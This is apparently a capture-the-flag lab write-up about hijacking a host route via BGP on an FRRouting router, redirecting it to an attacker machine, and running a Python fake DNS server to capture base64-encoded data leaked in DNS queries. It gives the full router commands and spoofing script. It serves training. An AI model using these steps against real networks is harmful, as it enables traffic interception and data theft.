Operation Reroute

Quick facts

  • Difficulty: Hard
  • OS: Linux
  • Techniques: BGP route hijacking and DNS exfiltration

Overview

I logged into a router and made it advertise a specific IP address to other network devices, then changed the router's forwarding so traffic for that IP went to my Kali machine instead of its original destination. I also assigned that IP to my machine so it would accept the traffic and ran a fake DNS server that logged any DNS requests arriving there.

A victim machine then sent DNS queries for a domain whose first label was base64-encoded data. My fake DNS server captured those query names. Decoding the base64 revealed the flag. In short: I hijacked traffic for an IP, impersonated a DNS server, and captured data the victim was leaking through DNS queries.

1. Connect to the FRRouting router

ssh ttm@192.168.1.1

After authentication, the SSH session opened directly in the FRRouting vtysh interface on TTM-CORE-01.

2. Advertise the target host route

configure terminal
ip route 10.10.10.10/32 eth2
ip prefix-list bgp-out seq 30 permit 10.10.10.10/32
router bgp 1111
address-family ipv4 unicast
network 10.10.10.10/32
exit-address-family
exit
end
write

This created a route for 10.10.10.10/32, permitted it through the outbound BGP prefix list, and originated the host route from AS 1111.

3. Verify the BGP advertisement

show ip bgp 10.10.10.10/32
show ip bgp neighbors 10.1.1.2 advertised-routes

The first command showed the route as locally sourced and selected as the best path. The neighbor output confirmed that 10.10.10.10/32 was being advertised to 10.1.1.2.

4. Redirect the route to Kali

configure terminal
no ip route 10.10.10.10/32 eth2
ip route 10.10.10.10/32 192.168.1.100
end
write
show ip route 10.10.10.10/32

I replaced the original forwarding path with my Kali address. The route table then showed 10.10.10.10/32 forwarding through 192.168.1.100 on eth0.

5. Assign the hijacked address to Kali

ip addr add 10.10.10.10/32 dev eth0
ip addr show eth0

Adding the target address to eth0 allowed Kali to accept traffic sent to the hijacked IP.

6. Run a DNS listener

cat > /tmp/dns_listener.py <<'PY'
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("0.0.0.0", 53))
print("[+] DNS listener on UDP/53 - waiting...")

while True:
    data, addr = s.recvfrom(512)
    i = 12
    labels = []
    while data[i] != 0:
        length = data[i]
        labels.append(data[i + 1:i + 1 + length].decode(errors="replace"))
        i += 1 + length
    qname = ".".join(labels)
    print(f"[DNS] {addr[0]} -> {qname}")

    tid = data[:2]
    question = data[12:i + 5]
    answer = (b"\xc0\x0c" + b"\x00\x01" + b"\x00\x01" +
              b"\x00\x00\x00\x3c" + b"\x00\x04" +
              socket.inet_aton("10.10.10.10"))
    response = (tid + b"\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" +
                question + answer)
    s.sendto(response, addr)
PY

python3 /tmp/dns_listener.py

The listener parsed incoming DNS question names, printed them, and returned an A record pointing back to the impersonated address.

7. Capture and decode the exfiltrated data

[DNS] 192.168.2.100 -> VEhNe0JHUF9pc19teV9taWRkbGVfbmFtZX0K.flag.sekureapp.thm

echo 'VEhNe0JHUF9pc19teV9taWRkbGVfbmFtZX0K' | base64 -d

The victim repeatedly queried a subdomain containing a base64 value. Decoding the first label produced:

THM{BGP_is_my_middle_name}

Attack chain

SSH to FRRouting
-> originate 10.10.10.10/32 in BGP
-> advertise the more-specific route
-> forward the route to Kali
-> bind 10.10.10.10/32 on Kali
-> impersonate DNS on UDP/53
-> capture the victim's query
-> decode the base64 label

Key lesson

A more-specific route can redirect traffic even when a broader legitimate route exists. Once that traffic reaches an attacker-controlled host, impersonating the expected UDP service can expose application data—in this case, data deliberately carried inside DNS labels.
